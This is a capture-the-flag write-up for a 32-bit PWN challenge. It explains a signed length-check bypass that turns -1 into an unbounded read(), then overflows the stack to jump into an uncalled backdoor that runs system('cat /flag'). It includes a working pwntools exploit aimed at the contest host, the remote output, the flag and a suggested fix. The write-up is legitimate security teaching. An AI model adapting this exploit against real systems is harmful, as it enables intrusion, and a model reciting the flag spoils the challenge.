# The Path of Redemption · Writeup (English)

- **Challenge**: 救赎之道 (The Path of Redemption)
- **Category**: PWN · **Points**: 300
- **Attachments**: `pwn` (ELF 32-bit LSB x86, 19 KB, dynamically linked, interpreter `./ld-linux.so.2`, not stripped), `题干.txt` (challenge description)
- **Keywords**: stack overflow · signed-comparison bypass · ret2backdoor · The Shawshank Redemption
- **Final flag**: `npusec{llFE_is_coIOr1ul_and_90_1oR_freE}`

---

## Challenge Text (translated)

> The Path of Redemption / 300 pts
>
> Salvation lies within.
> You know, some birds are not meant to be caged; their every feather shines with the glory of freedom.
>
> Instance: `ctf.npusec.org.cn:10162`

Both lines quote *The Shawshank Redemption*: the first is Warden Norton's Bible inscription — the rock hammer was hidden inside the hollowed-out Bible; the second is Red's line about Andy. The description spoils the solution twice: **the backdoor is hidden inside the binary, and it is your escape tool.**

---

## Solution

### Step 1: Static Recon — the "Hammer in the Bible" Is an Orphan Function

```text
$ file pwn
pwn: ELF 32-bit LSB executable, Intel 80386, dynamically linked,
     interpreter ./ld-linux.so.2, not stripped

RELRO: Partial RELRO | STACK CANARY: No canary | NX: enabled | PIE: No PIE

080493ce <main>    — prints the story banner, only calls dig()
080492e8 <dig>     — dig the tunnel: reads a "depth" number, then read()s content
0804922a <redeem>  — never called by anyone (orphan function = backdoor)
080491e6 <init>    — setbuf, unbuffered I/O
PLT: read / printf / fgets / puts / system / exit / atoi / setbuf
```

Two signals that lock in the direction immediately:

1. **`redeem` has no callers** — `main` only calls `dig`. "Salvation lies within": the backdoor is hidden in the program, just like the hammer inside the Bible
2. **`system@plt` sits in the import table** — the ending is telegraphed

32-bit, no canary, no PIE, fixed addresses — every precondition for a textbook stack overflow is in place.

<!-- 📷 Screenshot slot 1: checksec/function-map terminal screenshot, to be added on re-run -->
![Screenshot 1: checksec & function map (file + checksec + nm listing)](./screenshots/redemption_01_checksec.png)

### Step 2: Vulnerability Analysis of dig() — `jle` Lets Negatives Through, -1 Becomes an Unbounded read

```asm
8049330: call   fgets@plt          ; fgets(ebp-0x60, 0x10, stdin) reads one number
804933f: call   atoi@plt           ; n = atoi(buf)
8049347: mov    [ebp-0x10], eax    ; n stored as int
804934a: cmp    DWORD PTR [ebp-0x10], 0x40
804934e: jle    8049364            ; ★ SIGNED comparison: passes if n <= 64
...
8049381: push   0x0
8049383: call   read@plt           ; read(0, ebp-0x50, n)  ← n passed straight through
```

Two fatal details:

1. **Signed comparison**: `jle` is a *signed* jump. The check intends "at most 64 bytes", but input `-1` satisfies `-1 <= 64` and passes
2. **int passed straight to read()**: read's size argument is `size_t` (unsigned), so `-1` becomes `0xFFFFFFFF` (the Linux kernel clamps it to `0x7FFFF000`) — effectively an **unbounded read** into the small buffer at `ebp-0x50`. Textbook stack overflow.

The trailing "clamp the return value into [0,0x3f] and append `\0`" code only tidies up for `printf("%s")`; it does not affect the overflow.

<!-- 📷 Screenshot slot 2: dig() disassembly (IDA F5 or objdump), highlight the jle and read lines, to be added on re-run -->
![Screenshot 2: dig() vulnerability disassembly (signed jle check + read(0, buf, n))](./screenshots/redemption_02_dig_disasm.png)

### Step 3: ret2backdoor — 84-byte Offset, One-Shot Kill

The backdoor itself:

```asm
0804922a <redeem>:
  ...puts(...)                    ; prints the stormy-night sewage-crawl ASCII art
80492cf: lea    eax,[ebx-0x1e96]  ; → 0x804a16a = "cat /flag"
80492d6: call   system@plt        ; system("cat /flag")
80492e3: call   exit@plt
```

Everything needed for exploitation:

- **Offset**: buffer at `ebp-0x50`, distance to the return address = `0x50 + 4` (saved ebp) = **84 bytes**
- **Target**: `redeem` initializes its own `ebx` via `__x86.get_pc_thunk.bx`, so jumping to its entry just works — no arguments, no stack alignment; it runs `cat /flag` and exits
- **Zero libc dependency**: `system` resolves through the binary's own PLT (lazy binding) — no leak, no version matching; the custom `./ld-linux.so.2` deployment detail is irrelevant to this path

<!-- 📷 Screenshot slot 3: redeem() backdoor disassembly, highlight system("cat /flag"), to be added on re-run -->
![Screenshot 3: redeem() backdoor disassembly (system("cat /flag") + exit)](./screenshots/redemption_03_redeem_disasm.png)

Full exploit:

```python
#!/usr/bin/env python3
# The Path of Redemption — signed-size bypass + ret2backdoor
from pwn import *

context.arch = 'i386'

REDEEM  = 0x804922a   # orphan backdoor: system("cat /flag")
OFFSET  = 0x50 + 4    # buf(ebp-0x50) -> saved ebp -> ret = 84

io = remote('ctf.npusec.org.cn', 10162)
io.sendline(b'-1')                            # atoi=-1, signed jle passes
io.sendline(b'A' * OFFSET + p32(REDEEM))      # read(0, buf, 0xffffffff)
print(io.recvall(timeout=10).decode('utf-8', 'replace'))
```

Live-fire output from the remote:

```text
Chisel marks left on the wall: AAAA... (63 A's echoed by printf's %s)

A night of thunder and rain.
You crawl five hundred yards through a sewage pipe and wash the filth off in the river.
The rainstorm hammers down on your outstretched arms. In that moment, you are finally free.

Salvation lies within.
Hope is a good thing, maybe the best of things, and no good thing ever dies.
— Get busy living, or get busy dying.
npusec{llFE_is_coIOr1ul_and_90_1oR_freE}
```

**One-shot kill** (flag on the first attempt), with the remote playing out the full story: chisel the wall (overflow) → crawl the sewage pipe (hijack the return address) → freedom in the rain (flag). The leetspeak flag decodes to "life is colorful and go for free".

<!-- 📷 Screenshot slot 4: exploit run screenshot (python exp.py full output with story epilogue and flag), to be added on re-run -->
![Screenshot 4: live-fire exploit output and flag](./screenshots/redemption_04_exploit_flag.png)

---

## Full Attack Chain

```
pwn (ELF 32-bit · no canary · no PIE)
  ├─ recon: orphan redeem() = the hammer in the Bible (contains system("cat /flag"))
  └─ dig():
       ├─ fgets→atoi stores int, signed jle check: -1 <= 64 passes
       ├─ read(0, ebp-0x50, -1→0xFFFFFFFF) → unbounded read → stack overflow
       └─ 'A'*84 + p32(redeem) → dig's ret → redeem → system("cat /flag") → flag
```

---

## Takeaways

1. **Signed length-check bypass**: `jle/jg` are signed comparisons, so a negative number always satisfies `n <= limit`; whenever a challenge reads a number to use as a length, probe with `-1` first
2. **int→size_t sign extension**: a negative `int` passed into the `size_t` parameter of `read/memcpy/strncpy` becomes a huge unsigned value (the kernel clamps read to `0x7FFFF000`), i.e. an unbounded write; the fix is `if ((unsigned)n > 0x40) return;`
3. **An orphan function is the hammer handed to you**: with symbols intact, list all functions and look for ones with no callers — usually a backdoor left by the author, saving you the entire ROP/libc-leak workflow
4. **32-bit stack overflow offset formula**: with buf at `ebp-0x50`, the distance to ret = `0x50 + 4` (saved ebp occupies 4 bytes) — don't forget the +4
5. **Prefer zero-libc solutions**: when the binary ships `system@plt`, lazy binding makes the backdoor self-contained; hunt for a built-in backdoor before reaching for ret2libc

---

## Post-mortem Notes

- The length check uses `jle` (signed), not `jb/jbe` (unsigned) — glancing at it as "there is a length check, skip" would miss the entire point of the challenge; **read the comparison instruction itself, not just whether a check exists**
- WSL2 lacks the 32-bit runtime (`libc6:i386`/`patchelf`/`qemu-i386` all missing): this challenge was solved by going zero-libc straight at the remote; the next 32-bit challenge that needs local debugging will require the environment first
- Chinese paths blow up encoding when passed through `wsl bash -c` — copy the binary to an ASCII path (e.g. `~/pwn_work`) first
